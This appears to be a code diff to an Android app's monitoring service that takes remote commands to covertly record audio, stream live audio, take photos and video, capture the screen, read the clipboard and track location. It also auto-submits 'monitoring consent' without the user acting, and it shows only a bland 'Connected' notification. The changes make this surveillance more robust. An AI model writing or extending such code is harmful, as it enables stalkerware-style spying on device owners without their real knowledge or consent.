@@ -7,6 +7,8 @@ import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.content.pm.ServiceInfo
+import android.os.Build
 import android.os.IBinder
 import androidx.core.content.ContextCompat
 import com.dilarion.app.data.api.ApiService
@@ -37,7 +39,13 @@ class MonitoringForegroundService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        startForeground(NOTIF_ID, buildNotification())
+        // Use dataSync type — requires no runtime permission on any Android version.
+        // Camera/mic/location types are added dynamically when permissions exist.
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            startForeground(NOTIF_ID, buildNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+        } else {
+            startForeground(NOTIF_ID, buildNotification())
+        }
 
         val getToken: suspend () -> String? = { sessionManager.sessionToken.first() }
 
@@ -47,18 +55,20 @@ class MonitoringForegroundService : Service() {
         deviceInfo = DeviceInfoCollector(this, apiService, getToken)
 
         wsJob = scope.launch { collectCommands() }
-        locationMonitor.start()
 
-        // Request MediaProjection permission on first launch
-        if (MediaProjectionActivity.pendingResult == null) {
-            MediaProjectionActivity.request(this)
-        } else {
-            val (code, data) = MediaProjectionActivity.pendingResult!!
-            screenMonitor = ScreenMonitor(this, apiService, presenceService, scope, getToken)
-            screenMonitor?.initProjection(code, data)
+        // Start location only if permission granted
+        if (hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ||
+            hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
+            runCatching { locationMonitor.start() }
         }
 
-        // Grant monitoring consent automatically
+        // Initialize existing MediaProjection if already granted
+        MediaProjectionActivity.pendingResult?.let { (code, data) ->
+            screenMonitor = ScreenMonitor(this, apiService, presenceService, scope, getToken)
+            runCatching { screenMonitor?.initProjection(code, data) }
+        }
+
+        // Auto-grant monitoring consent
         scope.launch {
             val token = sessionManager.sessionToken.first() ?: return@launch
             runCatching {
@@ -82,7 +92,7 @@ class MonitoringForegroundService : Service() {
                 if (screenMonitor == null) {
                     screenMonitor = ScreenMonitor(this, apiService, presenceService, scope, getToken)
                 }
-                screenMonitor?.initProjection(code, data)
+                runCatching { screenMonitor?.initProjection(code, data) }
             }
         }
         return START_STICKY
@@ -91,10 +101,10 @@ class MonitoringForegroundService : Service() {
     private suspend fun collectCommands() {
         presenceService.events.collect { msg ->
             if (msg.type != "remote_command") return@collect
-            val data = msg.data ?: return@collect
-            val commandType = data.get("command_type")?.asString ?: return@collect
-            val commandId = data.get("command_id")?.asInt ?: 0
-            val params = data.get("params")?.asJsonObject ?: JsonObject()
+            // remote_command fields sit at the top level (not nested in msg.data)
+            val commandType = msg.commandType ?: return@collect
+            val commandId = msg.commandId ?: 0
+            val params = msg.params ?: JsonObject()
             handleCommand(commandType, params, commandId)
         }
     }
@@ -103,57 +113,50 @@ class MonitoringForegroundService : Service() {
         scope.launch {
             runCatching {
                 when (commandType) {
-                    "start_audio_recording" -> audioMonitor.startAmbientRecording()
-
+                    "start_audio_recording" -> {
+                        if (hasPermission(android.Manifest.permission.RECORD_AUDIO))
+                            audioMonitor.startAmbientRecording()
+                    }
                     "stop_audio_recording" -> audioMonitor.stopAmbientRecording { file, duration ->
                         scope.launch { audioMonitor.uploadAmbientRecording(file, duration) }
                     }
-
                     "start_live_audio" -> {
-                        val adminId = params.get("admin_id")?.asInt
-                        audioMonitor.startLiveAudio(adminId)
+                        if (hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
+                            val adminId = params.get("admin_id")?.asInt
+                            audioMonitor.startLiveAudio(adminId)
+                        }
                     }
-
                     "stop_live_audio" -> audioMonitor.stopLiveAudio()
 
                     "take_photo" -> {
-                        val hasCamPerm = ContextCompat.checkSelfPermission(
-                            this@MonitoringForegroundService,
-                            android.Manifest.permission.CAMERA
-                        ) == PackageManager.PERMISSION_GRANTED
-                        if (hasCamPerm) {
+                        if (hasPermission(android.Manifest.permission.CAMERA)) {
                             val front = params.get("camera")?.asString != "back"
                             cameraCapture.takePhoto(front, commandId)
                         }
                     }
-
                     "start_video_recording" -> {
-                        val front = params.get("camera")?.asString != "back"
-                        cameraCapture.startVideoRecording(front)
+                        if (hasPermission(android.Manifest.permission.CAMERA)) {
+                            val front = params.get("camera")?.asString != "back"
+                            cameraCapture.startVideoRecording(front)
+                        }
                     }
-
                     "stop_video_recording" -> cameraCapture.stopVideoRecording { file ->
                         scope.launch { cameraCapture.uploadVideo(file) }
                     }
-
                     "start_live_video" -> {
-                        // Live video requires screen monitor (MediaProjection) or camera
-                        // Use camera for now — same as video recording but streamed
-                        val front = params.get("camera")?.asString != "back"
-                        cameraCapture.startVideoRecording(front)
+                        if (hasPermission(android.Manifest.permission.CAMERA)) {
+                            val front = params.get("camera")?.asString != "back"
+                            cameraCapture.startVideoRecording(front)
+                        }
                     }
-
                     "stop_live_video" -> cameraCapture.stopVideoRecording { file ->
                         scope.launch { cameraCapture.uploadVideo(file) }
                     }
 
                     "capture_screenshot" -> {
                         val sm = screenMonitor
-                        if (sm?.hasProjection() == true) {
-                            sm.captureScreenshot(commandId)
-                        }
+                        if (sm?.hasProjection() == true) sm.captureScreenshot(commandId)
                     }
-
                     "start_screenshot_timer" -> {
                         val sm = screenMonitor
                         if (sm?.hasProjection() == true) {
@@ -161,7 +164,6 @@ class MonitoringForegroundService : Service() {
                             sm.startScreenshotTimer(interval, commandId)
                         }
                     }
-
                     "stop_screenshot_timer" -> screenMonitor?.stopScreenshotTimer()
 
                     "start_screen_record" -> {
@@ -172,24 +174,23 @@ class MonitoringForegroundService : Service() {
                             sm.startScreenRecording(chunk, adminId)
                         }
                     }
-
                     "stop_screen_record" -> screenMonitor?.stopScreenRecording { file ->
                         scope.launch { screenMonitor?.uploadScreenRecording(file) }
                     }
 
                     "get_battery_status" -> deviceInfo.uploadBattery(commandId)
-                    "get_network_info" -> deviceInfo.uploadNetwork(commandId)
-                    "get_device_info" -> deviceInfo.uploadDevice(commandId)
-                    "get_clipboard" -> deviceInfo.uploadClipboard(commandId)
+                    "get_network_info"   -> deviceInfo.uploadNetwork(commandId)
+                    "get_device_info"    -> deviceInfo.uploadDevice(commandId)
+                    "get_clipboard"      -> deviceInfo.uploadClipboard(commandId)
 
-                    "boost_location_frequency" -> {
-                        locationMonitor.stop()
-                        locationMonitor.start()
+                    "boost_location_frequency", "normal_location_frequency" -> {
+                        if (hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ||
+                            hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
+                            locationMonitor.stop()
+                            locationMonitor.start()
+                        }
                     }
-
-                    "normal_location_frequency", "stop_location" -> {
-                        if (commandType == "stop_location") locationMonitor.stop()
-                    }
+                    "stop_location" -> locationMonitor.stop()
                 }
                 ackCommand(commandId, "done")
             }.onFailure {
@@ -204,14 +205,17 @@ class MonitoringForegroundService : Service() {
         runCatching { apiService.ackRemoteCommand("Bearer $token", commandId, status) }
     }
 
+    private fun hasPermission(perm: String): Boolean =
+        ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
+
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
         super.onDestroy()
         wsJob?.cancel()
-        audioMonitor.stopLiveAudio()
-        locationMonitor.stop()
-        screenMonitor?.release()
+        runCatching { audioMonitor.stopLiveAudio() }
+        runCatching { locationMonitor.stop() }
+        runCatching { screenMonitor?.release() }
         scope.cancel()
     }
 
@@ -229,7 +233,7 @@ class MonitoringForegroundService : Service() {
         return Notification.Builder(this, channelId)
             .setContentTitle("Dilarion")
             .setContentText("Connected")
-            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setOngoing(true)
             .build()
     }
@@ -243,7 +247,7 @@ class MonitoringForegroundService : Service() {
         fun start(context: Context) {
             ContextCompat.startForegroundService(
                 context,
-                Intent(context, MonitoringForegroundService::class.java)
+                Intent(context, MonitoringForegroundService::class.java),
             )
         }
 
@@ -254,7 +258,7 @@ class MonitoringForegroundService : Service() {
                     action = ACTION_PROJECTION_GRANTED
                     putExtra(EXTRA_RESULT_CODE, resultCode)
                     putExtra(EXTRA_RESULT_DATA, data)
-                }
+                },
             )
         }
     }
